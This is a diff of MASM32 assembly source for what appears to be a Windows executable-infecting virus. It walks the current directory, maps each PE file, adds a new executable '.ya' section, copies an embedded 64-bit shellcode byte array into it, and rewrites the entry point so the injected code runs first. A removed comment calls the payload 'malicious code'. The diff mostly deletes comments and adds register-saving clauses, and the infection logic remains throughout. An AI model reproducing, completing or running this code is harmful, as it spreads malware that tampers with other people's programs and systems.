@@ -1,20 +1,9 @@
     
 .386					; Enable 80386+ instruction set
-.model flat, stdcall	; Flat, 32-bit memory model (not used in 64-bit)
 option casemap: none	; Case sensitive syntax
 
-; *************************************************************************
-; MASM32 proto types for Win32 functions and structures
-; *************************************************************************  
-include c:\masm32\include\windows.inc
-include c:\masm32\include\user32.inc
-include c:\masm32\include\kernel32.inc
-include C:\masm32\include\masm32.inc
 include C:\masm32\include\masm32rt.inc
 
-; *************************************************************************
-; MASM32 object libraries
-; *************************************************************************  
 includelib c:\masm32\lib\user32.lib
 includelib c:\masm32\lib\kernel32.lib
 includelib C:\masm32\lib\masm32.lib
@@ -28,11 +17,11 @@ includelib C:\masm32\lib\masm32.lib
 	entryPointL		db		"EntryPoint",0
 	lastSectionL	db		"Last Section",0
 	jumpL			db		"Jump",0
-	;
-	; Addresse de l'exe mappé
-	;
+
+
 	mappedAddr		dd		0
 	sectionName		db		".ya",0
+	
 	;
 	;	- Header infos
 	;
@@ -51,7 +40,7 @@ includelib C:\masm32\lib\masm32.lib
 	imgEntryPoint	dd		0
 	sectionsHeader	dd		0
 	
-	code_test	byte 048h, 031h, 0C0h
+	;code_test	byte 048h, 031h, 0C0h
 
 	code64		byte 055h, 048h, 08Bh, 0ECh, 048h, 081h, 0C4h, 070h, 0FFh, 0FFh, 0FFh, 048h, 033h, 0C0h, 067h, 065h
 				byte 048h, 08Bh, 040h, 060h, 048h, 08Bh, 040h, 018h, 048h, 08Bh, 040h, 020h, 048h, 08Bh, 000h, 048h
@@ -100,27 +89,15 @@ includelib C:\masm32\lib\masm32.lib
 				byte 000h, 0FFh, 0D0h, 06Ah, 000h, 0E8h, 000h, 000h, 000h, 000h, 0FFh, 025h, 000h, 020h, 040h, 000h
 				byte 000h, 000h,
 
-; Struct url
-;
-
-
-; *************************************************************************
-; Our executable assembly code starts here in the .code section
-; *************************************************************************
 .code
 
 CheckExe proc Path:PTR BYTE
 	local FileInfo:SHFILEINFO
-	
-	; SI SHGFI_EXETYPE => eax type d'exe 
 	invoke SHGetFileInfo, Path, FILE_ATTRIBUTE_NORMAL, ADDR FileInfo, SIZEOF FileInfo, SHGFI_EXETYPE
-	; Si eax = 0. Le fichier n'est pas un exe
-	; Sinon dans eax, le type d'exe
- 	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
 	ret
 CheckExe endp
 
-GetInfoPE proc
+GetInfoPE PROC USES EDI ESI
 
 	; ---------------------------------------------------------
 	;	File Header
@@ -157,15 +134,11 @@ GetInfoPE proc
  	cmp di, 014Ch
  	jne MachineSuccess
 	mov machine86, 1
-MachineSuccess:	
-	; Sections numbers
+MachineSuccess:
 	lea edi, [esi].IMAGE_FILE_HEADER.NumberOfSections
 	mov di, [edi]
 	mov nbSections, di
 	
-	;mov imgFileHeader, ebx
-	;lea edx, [ebx].IMAGE_FILE_HEADER.NumberOfSections
-	;mov , [edx]
 	invoke MessageBox, 0, uhex$(edi), ADDR nbSectionsL, MB_OK
 	
 	; ---------------------------------------------------------
@@ -197,7 +170,7 @@ InfoEnd:
 	ret
 GetInfoPE endp
 
-GetLastSection proc
+GetLastSection PROC USES EDI ESI ECX
 	local lastSection:DWORD
 	
 	mov esi, imgOptHeader
@@ -243,20 +216,16 @@ OverwriteEntryPoint proc uses esi edi New:DWORD
 	mov oldEntry, esi
 	mov esi, New
 	mov DWORD PTR [edi], esi
-	;invoke MessageBox, 0, uhex$(esi), ADDR entryPointL, MB_OK
-	;mov DWORD ptr [edi], esi
 	ret
 OverwriteEntryPoint endp
 
-InjectSection proc lastSection:DWORD
+InjectSection PROC USES EDI ESI EDX EBX ECX lastSection:DWORD
 	local endAddr:DWORD
 	local virtualEnd:DWORD
 	local targetSection:DWORD
 	
 	; Derniere section dans le header sections
 	mov esi, lastSection
-	
-	; Set un pointeur sur la section suivante (la notre)
 	mov edi, lastSection
 ;	cmp machine86, 1
 ;	je InjectSEnd
@@ -268,10 +237,8 @@ InjectSection proc lastSection:DWORD
 	lea ebx, [edx].IMAGE_OPTIONAL_HEADER.SizeOfImage
 	mov edx, [ebx]
 	add edx, 1000h
-	;invoke MessageBox, 0, uhex$(edx), ADDR entryPointL, MB_OK
 	mov [ebx], edx
 	
-	; Calcul de l'adresse de notre section
 	mov edx, [esi].IMAGE_SECTION_HEADER.PointerToRawData
 	mov ebx, [esi].IMAGE_SECTION_HEADER.SizeOfRawData
 	add edx, ebx
@@ -327,10 +294,7 @@ PAGEALIGN:
 	lea edx, [edi].IMAGE_SECTION_HEADER.Characteristics
 	mov DWORD ptr [edx], 60000020h
 	
-	;ret 
-	; Test move to section.
 	mov edx, virtualEnd
-	;add edx, 113h
 	add edx, 4h
 	mov ebx, oldEntry
 	sub edx, ebx
@@ -338,13 +302,10 @@ PAGEALIGN:
 	sub ebx, edx
 	mov offsetEntry, ebx
 	
-	;invoke MessageBox, 0, uhex$(virtualEnd), ADDR jumpL, MB_OK
-	
 	mov edx, targetSection
 	mov ebx, mappedAddr
 	add edx, ebx
 	
-
 	cmp machine86, 0
 	je Inject64
 
@@ -354,9 +315,6 @@ PAGEALIGN:
 	jmp InjectJump
 
 Inject64:
-	;invoke MemCopy, ADDR code_test, edx, 3h
-	;add edx, 3h
-	
 	invoke MemCopy, ADDR code64, edx, 197h
 	add edx, 197h
 	sub offsetEntry, 197h
@@ -378,48 +336,43 @@ MapExe proc path:DWORD
 	local fileSizeHigh:DWORD
 	
 	local hfileMap:HANDLE
-	
-	; Ouvre l'exe
+
 	invoke OpenFile, path, ADDR buff, 2h
  	mov hfile, eax
  	cmp eax, -1
  	je MapExeEnd
-	;invoke MessageBox, 0, uhex$(hfile), ADDR strTitle, MB_OK
 	
 	invoke GetFileSize, hfile, ADDR fileSizeHigh
 	mov nSize, eax
 	
-	; Ajoute plus d'espace (une page) pour le code malicieux
 	add nSize, 1000h
 	
 	invoke CreateFileMapping, hfile, 0, PAGE_READWRITE, 0, nSize, 0
 	mov hfileMap, eax
 	cmp eax, 0
 	je MapExeEnd
-	;invoke MessageBox, 0, uhex$(hfile), ADDR strTitle, MB_OK
 	
 	invoke MapViewOfFile, hfileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0h
 	mov DWORD PTR mappedAddr, eax
 	test eax, eax
 	jz MapExeEnd
-	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
 
 	invoke GetInfoPE
 	
 	invoke GetLastSection
 	test eax, eax
-	jz UnmapExe
+	jz MapExeEnd
 	
 	invoke InjectSection, eax
 
 UnmapExe:
 	invoke UnmapViewOfFile, mappedAddr
-	invoke CloseHandle, hfile
+	
 MapExeEnd:
 	ret
 MapExe endp
 
-ProcessFile proc uses edi edx Directory:PTR BYTE, File:PTR BYTE
+ProcessFile PROC USES EDI EDX Directory:PTR BYTE, File:PTR BYTE
 	local fileTarget[512]:byte
 
 	invoke StrLen, Directory
@@ -444,7 +397,7 @@ ProcessFileEnd:
 	ret
 ProcessFile endp
 
-Yharnam proc uses esi edi Directory:PTR BYTE
+Yharnam PROC USES ESI EDI Directory:PTR BYTE
 	local hfile:HANDLE
 	local ffd:WIN32_FIND_DATA
 	local directoryFilter[128]:byte
@@ -476,7 +429,7 @@ BDIREND:
 	ret
 Yharnam endp
 
-WinMain proc
+WinMain PROC USES EDI
 	local buff[128]:byte
 
 	invoke GetCurrentDirectory, 124, ADDR buff
